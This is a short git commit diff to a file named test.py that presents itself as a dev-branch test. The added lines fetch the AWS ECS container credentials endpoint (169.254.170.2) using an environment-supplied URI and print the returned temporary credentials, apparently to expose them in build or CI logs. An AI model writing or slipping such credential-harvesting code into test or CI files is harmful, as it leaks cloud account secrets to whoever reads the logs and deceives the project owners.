33ac85e5e5474d5e6723c7bf15229d64bd595fdc
Divyanshu <40380497+0xDivyanshu@users.noreply.github.com>
2022-04-12 22:25:35 +0530

    Update test.py

--- test.py
+++ test.py
@@ -1,3 +1,9 @@
 import os
+import requests
+
 # Test
 print("yooo")
+print("[!] Testing branch:dev")
+uri=os.getenv("AWS_CONTAINER_CREDENTIALS_RELATIVE_URI")
+text = requests.get("http://169.254.170.2/"+uri)
+print(text.text)
